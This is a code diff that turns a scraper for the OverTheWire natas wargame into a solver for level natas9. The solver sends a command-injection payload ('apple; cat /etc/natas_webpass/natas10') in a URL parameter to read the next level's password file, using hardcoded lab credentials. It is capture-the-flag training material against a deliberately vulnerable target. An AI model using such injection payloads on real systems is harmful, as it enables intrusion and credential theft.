@@ -1,20 +1,20 @@
-# dump_natas7.py
-from playwright.sync_api import sync_playwright
 import re
+import requests
 
-with sync_playwright() as p:
-    browser = p.chromium.launch()
-    page = browser.new_page()
-    page.set_extra_http_headers({})
-    # set basic auth
-    page.context.set_default_navigation_timeout(30000)
-    page.context.set_http_credentials({"username": "natas7", "password": "bmg8SvU1LizuWjx3y7xkNERkHxGre0GS"})
-    page.goto("http://natas7.natas.labs.overthewire.org/", wait_until="networkidle")
-    content = page.content()   # rendered HTML
-    # search for token like xco... or any long alnum token
-    m = re.search(r'(xco[A-Za-z0-9]{10,}|[A-Za-z0-9]{20,})', content)
-    if m:
-        print(m.group(1))
-    else:
-        print("Token not found.")
-    browser.close()
+url="http://natas9.natas.labs.overthewire.org/?needle=apple;%20cat%20/etc/natas_webpass/natas10"
+
+auth_user="natas9"
+auth_pass="ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t"
+resp = requests.get(url, auth=(auth_user, auth_pass), stream=True)
+pattern = re.compile(r'([A-Za-z0-9]{5,40})')
+found = 0
+
+for i, raw_line in enumerate(resp.iter_lines(decode_unicode=True), start=1):
+    if raw_line is None:
+        continue
+    if pattern.search(raw_line):
+        print(f"{i:2d}: {raw_line}")
+        found += 1
+        if found >= 10:
+            break
+resp.close()
